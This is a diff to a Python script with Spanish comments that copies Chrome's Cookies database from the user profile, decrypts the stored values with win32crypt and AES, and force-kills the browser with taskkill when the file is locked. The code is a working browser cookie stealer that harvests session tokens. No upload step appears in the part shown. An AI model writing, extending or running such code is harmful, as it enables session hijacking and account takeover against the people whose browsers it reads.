@@ -6,6 +6,21 @@ import shutil
 from datetime import datetime, timedelta
 import win32crypt
 from Crypto.Cipher import AES
+import psutil
+import subprocess
+import time
+
+def obtener_proceso_usando_archivo(archivo):
+    for proceso in psutil.process_iter():
+        try:
+            archivos_abiertos = proceso.open_files()
+            for archivo_abierto in archivos_abiertos:
+                if archivo_abierto.path == archivo:
+                    return proceso
+        except psutil.AccessDenied:
+            pass
+    return None
+
 
 def obtener_fecha_calculada(microsegundos):
 
@@ -38,7 +53,7 @@ def obtener_llave_encriptacion():
 
 def desencriptar_dato(data, key):
     try:
-        # get the initialization vector
+        # vector de inicializazcion para el cifrado
         iv = data[3:15]
         data = data[15:]
         # genero el cifrado con la llave
@@ -114,9 +129,31 @@ def obtener_cookies():
     directorio_cookies = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                             "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
 
+
     # copio el archivo a mi lugar de ejecucion ya que se puede bloquear la bdd si el navegador la está usando
+    
     nuevo_archivo_bdd = "Cookies.db"
-    shutil.copyfile(directorio_cookies, nuevo_archivo_bdd)
+    try:
+        #intento copiar el archivo
+        shutil.copyfile(directorio_cookies, nuevo_archivo_bdd)
+    except:
+        # Obtener el proceso que está utilizando el archivo
+        proceso = obtener_proceso_usando_archivo(directorio_cookies)
+        # Nombre del proceso que quieres detener
+        nombre_proceso = str(proceso.name())
+        try:
+            # Ejecutar el comando para detener el proceso
+            subprocess.run(["taskkill", "/F", "/IM", nombre_proceso], check=True)
+            print(f"Proceso {nombre_proceso} detenido correctamente")
+            #espero
+            time.sleep(2)
+            #intento nuevamente
+            shutil.copyfile(directorio_cookies, nuevo_archivo_bdd)
+        
+        except subprocess.CalledProcessError as e:
+            print(f"No se pudo detener el proceso {nombre_proceso}: {e}")
+            
+
     # conecto
     db = sqlite3.connect(nuevo_archivo_bdd)
     # decodifico los datos ignorando errores
